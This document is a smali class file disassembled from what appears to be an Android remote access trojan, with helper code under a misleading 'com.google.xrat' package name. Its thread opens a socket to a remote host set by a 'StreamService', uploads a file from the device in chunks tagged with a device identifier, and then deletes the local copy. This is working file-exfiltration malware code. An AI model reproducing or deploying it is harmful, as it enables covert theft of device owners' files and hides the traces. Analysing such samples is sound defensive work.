.class final Lcom/v1/e;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lcom/v1/StreamService;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Z


# direct methods
.method public constructor <init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    iput-object p1, p0, Lcom/v1/e;->a:Lcom/v1/StreamService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/v1/e;->d:Z

    iput-object p2, p0, Lcom/v1/e;->b:Ljava/lang/String;

    const-string v0, ":"

    const-string v1, "-"

    invoke-virtual {p3, v0, v1}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/v1/e;->c:Ljava/lang/String;

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/v1/e;->d:Z

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 9

    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Ljava/net/Socket;

    iget-object v2, p0, Lcom/v1/e;->a:Lcom/v1/StreamService;

    iget-object v2, v2, Lcom/v1/StreamService;->a:Ljava/lang/String;

    iget-object v3, p0, Lcom/v1/e;->a:Lcom/v1/StreamService;

    iget v3, v3, Lcom/v1/StreamService;->b:I

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    new-instance v3, Ljava/io/File;

    iget-object v4, p0, Lcom/v1/e;->b:Ljava/lang/String;

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->canRead()Z

    move-result v4

    if-nez v4, :cond_1

    const/16 v0, 0xe5

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, ""

    invoke-static {v5}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v5

    invoke-static {v0, v3, v4, v5}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V

    :cond_0
    :goto_0
    return-void

    :cond_1
    new-instance v4, Ljava/io/DataInputStream;

    new-instance v5, Ljava/io/FileInputStream;

    iget-object v6, p0, Lcom/v1/e;->b:Ljava/lang/String;

    invoke-direct {v5, v6}, Ljava/io/FileInputStream;-><init>(Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    const/16 v5, 0xd9

    invoke-static {v5}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/io/DataOutputStream;->write([B)V

    const/4 v5, 0x0

    invoke-static {v5}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/io/DataOutputStream;->write([B)V

    new-instance v5, Ljava/io/File;

    iget-object v6, p0, Lcom/v1/e;->b:Ljava/lang/String;

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/io/File;->length()J

    move-result-wide v5

    long-to-int v5, v5

    add-int/lit8 v5, v5, 0x8

    invoke-static {v5}, Lcom/google/xrat/a/b;->a(I)[B

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/io/DataOutputStream;->write([B)V

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    iget-object v6, p0, Lcom/v1/e;->c:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "\u00a7"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v5

    array-length v5, v5

    int-to-short v5, v5

    invoke-static {v5}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/io/DataOutputStream;->write([B)V

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->write([B)V

    const/16 v3, 0x400

    new-array v3, v3, [B

    new-instance v5, Ljava/io/File;

    iget-object v6, p0, Lcom/v1/e;->b:Ljava/lang/String;

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/io/File;->length()J

    move-result-wide v5

    :goto_1
    int-to-long v7, v0

    cmp-long v7, v7, v5

    if-ltz v7, :cond_2

    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    invoke-virtual {v4}, Ljava/io/DataInputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V

    iget-boolean v0, p0, Lcom/v1/e;->d:Z

    if-eqz v0, :cond_0

    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/v1/e;->b:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/net/ConnectException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/net/ConnectException;->printStackTrace()V

    goto/16 :goto_0

    :cond_2
    :try_start_1
    invoke-virtual {v4, v3}, Ljava/io/DataInputStream;->read([B)I

    move-result v7

    add-int/2addr v0, v7

    const/4 v8, 0x0

    invoke-virtual {v2, v3, v8, v7}, Ljava/io/DataOutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/net/ConnectException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/net/UnknownHostException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/net/UnknownHostException;->printStackTrace()V

    goto/16 :goto_0

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_0
.end method
